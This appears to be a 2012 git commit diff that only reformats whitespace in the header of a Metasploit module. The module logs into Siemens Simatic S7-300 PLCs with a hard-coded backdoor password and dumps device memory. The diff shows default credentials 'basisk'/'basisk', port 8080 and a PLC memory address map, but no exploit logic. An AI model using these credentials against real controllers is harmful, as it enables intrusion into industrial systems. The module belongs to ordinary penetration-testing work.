e2806353f1fd4609976027d94b3029b5c58d6e79
Dillon <dillon.beresford@gmail.com>
2012-07-13 19:06:24 -0500

    Update master

--- simatic_s7_300_memory_view.rb
+++ simatic_s7_300_memory_view.rb
@@ -9,40 +9,41 @@ class Metasploit3 < Msf::Auxiliary
 		super(update_info(info,
 			'Name'        => 'Siemens Simatic S7-300 PLC Remote Memory Viewer',
 			'Description' => %q{ This module attempts to authenticate using a hard-coded backdoor password in 
-							   the Simatic S7-300 PLC and dumps the device memory using system commands.
-							   Mode: Values 8, 16 or 32 bit access
-							   Valid address areas are:
-							   80000000 - 81FFFFFF SD-Ram cached
-							   A0000000 - A1FFFFFF SD-Ram uncached
-							   A8000000 - A87FFFFF Norflash
-							   AFC00000 - AFC7FFFF ED-Ram int. uncached
-							   BFE00000 - BFEFFFFD COM-ED-Ram ext.
-							   C0000000 - C007FFFF ED-Ram int. cached
-							   D0000000 - D0005FFF Scratchpad data int.
-							   D4000000 - D4005FFF Scratchpad code int.
-							   F0100000 - F018FFFF SPS-Asic 16-Bit access only
-				},
-			  'Author'			=> 'Dillon Beresford',
-  		  'License'     			=> MSF_LICENSE,
-  		  'References'     =>
-  				[
-  				  [ 'URL', 'http://www.us-cert.gov/control_systems/pdf/ICS-ALERT-11-204-01%20S7-300_S7-400.pdf' ],
-  					[ 'URL', 'http://www.us-cert.gov/control_systems/pdf/ICS-ALERT-11-186-01.pdf' ],
-  					[ 'URL', 'http://www.us-cert.gov/control_systems/pdf/ICS-ALERT-11-161-01.pdf' ],
-  				],
-  			'Version'        => '$Revision$',
-  		  'DisclosureDate' => 'June 2011'
-  		  ))
-		    register_options(
-			    [
-				    Opt::RPORT(8080),
-				    OptString.new('USER', [ true, 'Simatic S7-300 hardcoded username.', 'basisk']),
-				    OptString.new('PASS', [ true, 'Simatic S7-300 hardcoded password.', 'basisk']),
-				    OptString.new('MODE', [ true, 'Memory Read Mode (8-bit, 16-bit, 32-bit)', '32']),
-				    OptString.new('HEX', [ true, 'Simatic S7-300 memory offset', '1']),
-				    OptString.new('OFFSET', [ true, 'Simatic S7-300 memory offset']),
-				    OptString.new('LENGTH', [ true, 'Memory Dump Length in Bits', '256'])
-			], self.class)
+			the Simatic S7-300 PLC and dumps the device memory using system commands.
+			Mode: Values 8, 16 or 32 bit access
+			Valid address areas are:
+			80000000 - 81FFFFFF SD-Ram cached
+			A0000000 - A1FFFFFF SD-Ram uncached
+			A8000000 - A87FFFFF Norflash
+			AFC00000 - AFC7FFFF ED-Ram int. uncached
+			BFE00000 - BFEFFFFD COM-ED-Ram ext.
+			C0000000 - C007FFFF ED-Ram int. cached
+			D0000000 - D0005FFF Scratchpad data int.
+			D4000000 - D4005FFF Scratchpad code int.
+			F0100000 - F018FFFF SPS-Asic 16-Bit access only
+		},
+		'Author'	=> 'Dillon Beresford',
+  		'License'     	=> MSF_LICENSE,
+  		'References'    =>
+  		  [
+  		  	[ 'URL', 'http://www.us-cert.gov/control_systems/pdf/ICS-ALERT-11-204-01%20S7-300_S7-400.pdf' ],
+  			[ 'URL', 'http://www.us-cert.gov/control_systems/pdf/ICS-ALERT-11-186-01.pdf' ],
+  			[ 'URL', 'http://www.us-cert.gov/control_systems/pdf/ICS-ALERT-11-161-01.pdf' ],
+  		  ],
+  		'Version'        => '$Revision$',
+  		'DisclosureDate' => 'June 2011'
+  		))
+		register_options(
+		    [
+		    	Opt::RPORT(8080),
+			OptString.new('USER', [ true, 'Simatic S7-300 hardcoded username.', 'basisk']),
+			OptString.new('PASS', [ true, 'Simatic S7-300 hardcoded password.', 'basisk']),
+			OptString.new('MODE', [ true, 'Memory Read Mode (8-bit, 16-bit, 32-bit)', '32']),
+			OptString.new('HEX', [ true, 'Simatic S7-300 memory offset', '1']),
+			OptString.new('OFFSET', [ true, 'Simatic S7-300 memory offset']),
+			OptString.new('LENGTH', [ true, 'Memory Dump Length in Bits', '256'])
+		    ], self.class)
+		    
 	end
 
 	def run_host(ip)
